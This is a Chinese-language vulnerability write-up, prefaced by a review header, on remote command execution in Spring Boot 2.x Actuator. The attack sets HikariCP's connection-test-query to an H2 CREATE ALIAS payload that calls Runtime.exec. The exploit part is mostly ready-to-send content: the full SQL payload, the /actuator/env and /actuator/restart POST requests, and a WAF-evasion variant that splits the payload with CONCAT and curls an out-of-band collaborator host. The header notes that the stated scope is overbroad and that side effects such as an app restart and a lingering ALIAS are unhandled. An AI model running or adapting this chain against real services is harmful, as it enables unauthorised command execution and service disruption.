---
source: "hatch 补库批 20260928"
product: "Spring Cloud Actuator→HikariCP→H2"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Spring Boot Actuator hikari配置不当导致的远程命令执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：Boot2.x太宽，需Cloud可写env/restart、Hikari属性绑定、H2支持ALIAS及DB权限"
side_effects: "未执行；本文需注意的操作影响：影响范围及默认端点错误泛化；并非所有Boot2.x都可POSTenv/restart，H2而非任意数据库才有该ALIAS语法；验证SQL失败可导致业务断连；正文承认失败不再返回其他查询，示例Scanner无输出抛异常且重启应用，缺恢复原值/清理ALIAS"
source_status: "unknown"
id: "vw-565aa3334fc3e08109407ddd"
entity_id: "ve-565aa3334fc3e08109407ddd"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Boot2.x太宽，需Cloud可写env/restart、Hikari属性绑定、H2支持ALIAS及DB权限

代码与实验材料：完整测试SQL和env/restart请求，重启应用且持久创建ALIAS；GUI Calculator不输出可能验证SQL报错

来源证据范围：先知7480及镜像实验仓库，没有依赖锁

- **代码与转录边界（1）**：影响范围及默认端点错误泛化；依据：并非所有Boot2.x都可POSTenv/restart，H2而非任意数据库才有该ALIAS语法。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **操作与副作用边界（2）**：验证SQL失败可导致业务断连；依据：正文承认失败不再返回其他查询，示例Scanner无输出抛异常且重启应用，缺恢复原值/清理ALIAS。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **适用与权限边界（3）**：新建连接/借出连接时机简化；依据：connectionTestQuery并非每次借出必执行，要核Hikari版本及JDBC4验证配置。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Spring Boot Actuator hikari配置不当导致的远程命令执行漏洞

一、漏洞简介
------------

Spring Boot
2.x默认使用的HikariCP数据库连接池提供了一个可以RCE的变量。这个变量就是`spring.datasource.hikari.connection-test-query`。这个变量与HikariCP中的`connectionTestQuery`配置相匹配。根据文档，此配置定义的是在从池中给出一个连接之前被执行的query，它的作用是验证数据库连接是否处于活动状态。简言之，无论何时一个恶心的数据库连接被建立时，`spring.datasource.hikari.connection-test-query`的值将会被作为一个SQL语句执行。然后利用SQL语句中的用户自定义函数，进行RCE。

二、漏洞影响
------------

Spring Boot 2.x

三、复现过程
------------

漏洞环境

> https://github.com/ianxtianxt/springboot\_actuator

### H2 CREATE ALIAS 命令

H2数据库引擎是一个流行的java开发数据库，非常容易与Spring
Boot集成，仅仅需要如下的一个dependency。

    <dependency>
        <groupId>com.h2database</groupId>
        <artifactId>h2</artifactId>
        <scope>runtime</scope>
    </dependency>

在H2中有一个非常重要的命令，与PostgreSQL中的用户定义函数相似，可以用CREATE
ALIAS创建一个java函数然后调用它，示例如下:

    CREATE ALIAS GET_SYSTEM_PROPERTY FOR "java.lang.System.getProperty";
    CALL GET_SYSTEM_PROPERTY('java.class.path');

仿照这个，创建命令执行的java函数可以如下:

    String shellexec(String cmd) throws java.io.IOException { 
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());
        if (s.hasNext()) {
            return s.next();
        } throw new IllegalArgumentException(); 
    }

那么RCE所需的SQL语句即:

    CREATE ALIAS EXEC AS "String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}";
    CALL EXEC('/Applications/Calculator.app/Contents/MacOS/Calculator');

与1.x类似，在端点`/actuator/env`通过POST方法进行环境变量的赋值。payload为

    POST /actuator/env HTTP/1.1

    content-type: application/json

    {"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}'; CALL EXEC('/Applications/Calculator.app/Contents/MacOS/Calculator');"}

执行RCE的SQL语句已经构建好，接下来就是触发一个新的数据库连接，通过向端点`/actuator/restart`发送POST请求，即可重启应用出发新的数据库连接。请求如下

    POST /actuator/restart HTTP/1.1

    content-type: application/json

    {}

命令执行的结果:

![](./.resource/SpringBootActuatorhikari配置不当导致的远程命令执行漏洞/media/rId25.png)

### 针对WAFs

在这点上，可能会遇到常见的WAF过滤器，特别是对exec的过滤。然而，像这样的一个payload可以很容易地使用多种字符串拼接技术来绕过。比如使用CONCAT或HEXTORAW命令。上面的payload可写成

    CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');
    CALL EXEC('curl  http://x.burpcollaborator.net');

### 有限的执行上下文的命令注入

`spring.datasource.hikari.connection-test-query`是用来验证连接到数据库的连接是否存活。如果语句失败，应用会相信数据库无法连接并不再返回其他的数据库查询。攻击者可利用此来获得一个blind
RCE。

参考链接
--------

> https://xz.aliyun.com/t/7480\#toc-3
